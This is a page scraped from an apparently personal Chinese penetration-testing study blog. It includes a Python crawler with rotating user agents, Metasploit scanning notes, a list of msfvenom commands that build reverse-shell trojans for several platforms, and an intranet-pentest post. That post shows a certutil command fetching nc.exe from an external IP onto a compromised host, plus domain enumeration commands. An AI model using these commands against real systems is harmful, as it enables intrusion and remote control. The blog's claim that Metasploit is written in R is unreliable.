class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  @author: kriller</span></span><br><span class="line"><span class="string">  @license: (C) Copyright 2013-2017, Node Supply Chain Manager Corporation Limited.</span></span><br><span class="line"><span class="string">  @contact: kriller@cumt.edu.cn</span></span><br><span class="line"><span class="string">  @file: get_test.py</span></span><br><span class="line"><span class="string">  @time: 2021/6/15 16:27</span></span><br><span class="line"><span class="string">  @desc: 自定义请求头(随机UA) 发起get请求</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> request</span><br><span class="line"><span class="keyword">import</span> urllib.parse <span class="keyword">as</span> parse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getheaders</span>():</span></span><br><span class="line">    <span class="comment"># 随机ua池</span></span><br><span class="line">    user_agent_list = [</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; &#x27;</span><span class="string">&#x27;x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Macintosh; U; PPC Mac OS X; pl-PL; rv:1.0.1) Gecko/20021111 Chimera/0.6&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko, Safari) Cheshire/1.0.UNOFFICIAL&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0&quot;</span>,<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&quot;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    uaa = random.choice(user_agent_list)</span><br><span class="line">    print(<span class="built_in">type</span>(uaa))</span><br><span class="line">    header = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:uaa&#125;</span><br><span class="line">    print(header)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">run</span>():</span></span><br><span class="line">  keyword = <span class="built_in">input</span>(<span class="string">&quot;输入搜索内容&quot;</span>)</span><br><span class="line">  url = <span class="string">&#x27;http://www.baidu.com/s?&#x27;</span></span><br><span class="line">  <span class="comment"># 参数写成一个字典</span></span><br><span class="line">  data = &#123;</span><br><span class="line">    <span class="string">&#x27;ie&#x27;</span>: <span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wd&#x27;</span>: keyword,</span><br><span class="line">  &#125;</span><br><span class="line">  print(<span class="built_in">type</span>(data))</span><br><span class="line">  query_str = parse.urlencode(data);</span><br><span class="line"></span><br><span class="line">  url += query_str</span><br><span class="line">  <span class="comment"># print(url)</span></span><br><span class="line">  <span class="comment"># 发送请求</span></span><br><span class="line">  <span class="comment">#构建请求对象</span></span><br><span class="line">  request_ob = request.Request(url=url,headers=getheaders())</span><br><span class="line">  <span class="comment">#发送请求</span></span><br><span class="line">  resp = request.urlopen(request_ob)</span><br><span class="line">  filename = keyword + <span class="string">&#x27;.html&#x27;</span></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(resp.read().decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getheaders()</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>

<p>最后抓包,发现随机ua已经生效。</p>
<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/image-20210615175738818.png" alt="image-20210615175738818"></p>
<p>继续ing。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://john-tlh.github.io/2021/06/15/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0day1/" data-id="ckpxx31u00000icw2coobatjz" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python'</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-metasploit 学习01" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/06/13/metasploit%20%E5%AD%A6%E4%B9%A001/" class="article-date">
  <time datetime="2021-06-12T16:58:27.668Z" itemprop="datePublished">2021-06-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/06/13/metasploit%20%E5%AD%A6%E4%B9%A001/">metasploit 学习01</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="metasploit-学习01"><a href="#metasploit-学习01" class="headerlink" title="metasploit 学习01"></a>metasploit 学习01</h2><p><strong>简介：</strong></p>
<p>R语言编写的开源工具，模板化框架，有很好的扩展性。</p>
<p><strong>模块介绍：</strong></p>
<p>Auxiliaries(辅助模块):扫描、搜索漏洞</p>
<p>Exploit(漏洞利用模块):漏洞利用</p>
<p>Payload(攻击载荷模块):发送payload</p>
<p>Post(后渗透模块):后渗透</p>
<p>Encoders(编码工具模块):免杀、绕过</p>
<p><strong>攻击步骤：</strong></p>
<ol>
<li>扫描目标系统寻找漏洞</li>
<li>配置一个exp模块</li>
<li>配置payload</li>
<li>选择编码</li>
<li>run</li>
</ol>
<p><strong>实例1：</strong>使用msf进行端口扫描（TCP探测）</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//代码如下</span><br><span class="line">msfconsole</span><br><span class="line">search portscan</span><br><span class="line">use auciliar/scanner/portscan/tcp</span><br><span class="line"><span class="built_in">set</span> rhosts xxx.xxx.xxx.xxx</span><br><span class="line"><span class="built_in">set</span> ports 1-10000</span><br><span class="line"><span class="built_in">set</span> threads 20</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>截图如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/image-20210613010129424.png" alt="image-20210613010129424"></p>
<p>结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/image-20210613010142629.png" alt="image-20210613010142629"></p>
<p><strong>实例2：</strong>使用msf调用nmap进行服务探测、扫描</p>
<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/image-20210613010154859.png" alt="image-20210613010154859"></p>
        
          <p class="article-more-link">
            <a href="/2021/06/13/metasploit%20%E5%AD%A6%E4%B9%A001/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="https://john-tlh.github.io/2021/06/13/metasploit%20%E5%AD%A6%E4%B9%A001/" data-id="ckpu06yy50000c4w21wux11zt" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-metasploit-学习02" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/06/13/metasploit-%E5%AD%A6%E4%B9%A002/" class="article-date">
  <time datetime="2021-06-12T16:46:53.158Z" itemprop="datePublished">2021-06-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/06/13/metasploit-%E5%AD%A6%E4%B9%A002/">metasploit 学习02</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="metasploit-学习02"><a href="#metasploit-学习02" class="headerlink" title="metasploit 学习02"></a>metasploit 学习02</h2><p><strong>简介：</strong>本地环境存在诸多限制，比如要发送payloaad反弹shell就需要一个公网ip。因此我选择将nsf搭建在vps上，具体教程请<a target="_blank" rel="noopener" href="https://www.linuxidc.com/Linux/2019-01/156378.htm">参考</a>：</p>
<p><strong>内容：</strong></p>
<p>利用msfvenom生成木马并且反弹shell。</p>
<p>首先介绍下msfvenon的基本用法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/image-20210613005623957.png" alt="image-20210613005623957"></p>
<p>列举出常用的生成shell的命令：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">linux：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">windows：</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">PHP:</span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">ASP:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">Bash：</span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br><span class="line"></span><br><span class="line">Perl：</span><br><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

<p>木马生成后只要想办法放到目标机器下，根据目标机器的具体情况选择合适的方式下载并执行你的木马即可，然后就可以在攻击机上获取到反弹回来的shell了：</p>
<p><strong>实例</strong></p>
<p>首先生成木马</p>
<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/image-20210613005640652.png" alt="image-20210613005640652"></p>
<p>然后在靶机上找到一个上传漏洞或者命令执行漏洞，下载或者上传我们生成的木马到靶机，这里我以命令执行为例：</p>
<p>上传后木马一直被杀软杀掉，考虑用免杀马，未完……</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/106348527">https://blog.csdn.net/qq_36119192/article/details/106348527</a></p>
        
          <p class="article-more-link">
            <a href="/2021/06/13/metasploit-%E5%AD%A6%E4%B9%A002/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="https://john-tlh.github.io/2021/06/13/metasploit-%E5%AD%A6%E4%B9%A002/" data-id="ckptztxmk000018w23o2adeo7" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-从命令执行到内网渗透" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/06/10/%E4%BB%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="article-date">
  <time datetime="2021-06-10T09:49:33.871Z" itemprop="datePublished">2021-06-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/06/10/%E4%BB%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">从命令执行到内网渗透</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><h3 id="维持访问"><a href="#维持访问" class="headerlink" title="维持访问"></a>维持访问</h3><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>此时获得了域内一台服务器的系统权限，但是该服务器不能直接访问域服务器。因此接下来需要攻击到内网中可以访问到域服务器的机器。首先需要<strong>探测内网存活主机</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l %i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">255</span>) <span class="keyword">do</span> @ <span class="built_in">ping</span> <span class="number">10</span>.<span class="number">10</span>.<span class="number">1</span>.%i -w <span class="number">1</span> -n <span class="number">1</span>|<span class="built_in">find</span> /i &quot;ttl=&quot;</span><br></pre></td></tr></table></figure>

<p>简单一点可以用ping扫描的方式，但是as中无法回显出结果。所以选择用<strong>nbtscan扫描。</strong>首先下载程序然后在目标机器执行：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://<span class="number">198</span>.<span class="number">13</span>.xxx.xxx/nc.exe</span><br><span class="line">nbtscan-<span class="number">1</span>.<span class="number">0</span>.<span class="number">35</span>.exe -m <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210610191018443.png" alt="image-20210610191018443"></p>
<p><code>查看域用户</code>：net user /domain</p>
<p><code>查看有几个域</code>：net view /domain</p>
<p><code>查看域内主机</code>: net view /domain:xxx</p>
<p><code>查看域内的组</code>:net view /domain</p>
<p><code>查看域管理员</code>: net group “domain admins” /domain</p>
<p><code>查看域控</code>: net group “domain controllers” /domain</p>
<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3>
        
          <p class="article-more-link">
            <a href="/2021/06/10/%E4%BB%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="https://john-tlh.github.io/2021/06/10/%E4%BB%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" data-id="ckpsj2aoz0000qsw24em2754s" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&amp;laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/">下一页 &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
